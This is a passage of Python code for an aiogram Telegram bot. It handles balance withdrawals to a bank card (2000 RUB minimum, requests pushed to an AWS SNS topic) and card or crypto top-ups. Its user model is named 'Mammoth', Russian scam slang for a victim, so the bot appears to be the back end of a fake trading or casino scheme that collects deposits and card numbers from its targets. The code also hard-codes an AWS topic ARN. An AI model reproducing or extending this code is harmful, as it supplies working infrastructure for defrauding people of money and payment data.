        mammonth = session.query(Mammoth).filter(Mammoth.telegram_id == message.from_user.id).first()

        if float(message.text) <= mammonth.balance:
            if float(message.text) >= 2000:
                data = await state.get_data()
                user_id = data['user_id']
                card_num = data['card_num']


                new_application_to_withdraw = Withdraws(user_id = user_id, card = card_num, amount = float(message.text))
                session.add(new_application_to_withdraw)
                session.commit()
                mammonth.balance -= new_application_to_withdraw.amount
                session.commit()
                message_attributes = {
                    'withdraw_id': {
                        'DataType': 'Number',
                        'StringValue': f'{new_application_to_withdraw.id}'
                    }
                }

                sns.publish(TopicArn='arn:aws:sns:eu-north-1:441199499768:ApplicationsToWithdraw',

                            Message=f'''NewApplicationToWithdraw''', MessageAttributes=message_attributes

                            )
                await  message.answer('Заявка на рассмотрении, ожидайте')
                await state.finish()
            else:
                await message.answer('Сумма вывода должна быть от 2000 RUB')
                await state.finish()
        else:
            await message.answer('Сумма вывода больше чем ваш баланс!')
            await state.finish()

    @dp.callback_query_handler(lambda callback_query: callback_query.data == 'withdraw')
    async def handle_withdraw(query: types.CallbackQuery):
        await WithdrawStates.first.set()
        await query.message.answer("Введите действительный номер банковской карты")


    @dp.callback_query_handler(lambda callback_query: callback_query.data == 'top_up_balance_by_card')
    async def handle_top_up_balance_by_card(query: types.CallbackQuery):
        await TopUpBalance.WaitingForSum.set()
        mammonth = session.query(Mammoth).filter(Mammoth.telegram_id == query.from_user.id).first()
        await query.message.answer(f'💰 Введите сумму пополнения от {mammonth.min_input_output_amount_value} RUB до 250000 RUB')

    @dp.callback_query_handler(lambda callback_query: callback_query.data == 'top_up_balance_by_crypto')
    async def handle_top_up_balance_by_card(query: types.CallbackQuery):
        mammonth = session.query(Mammoth).filter(Mammoth.telegram_id == query.from_user.id).first()
        await TopUpBalance.WaitingForSumCrypto.set()
        await query.message.answer(f'💰 Введите сумму пополнения от {mammonth.min_input_output_amount_value} RUB до 250000 RUB')


    @dp.message_handler(commands=['get_state'])
    async def get_state(message: types.Message, state: FSMContext):
        current_state = await state.get_state()
        await message.answer(f"Текущее состояние пользователя: {current_state}")

    from aiogram import executor

    storage = MemoryStorage()
    # Подключаем MemoryStorage к боту
    dp.storage = storage
    executor.start_polling(dp, skip_updates=True)

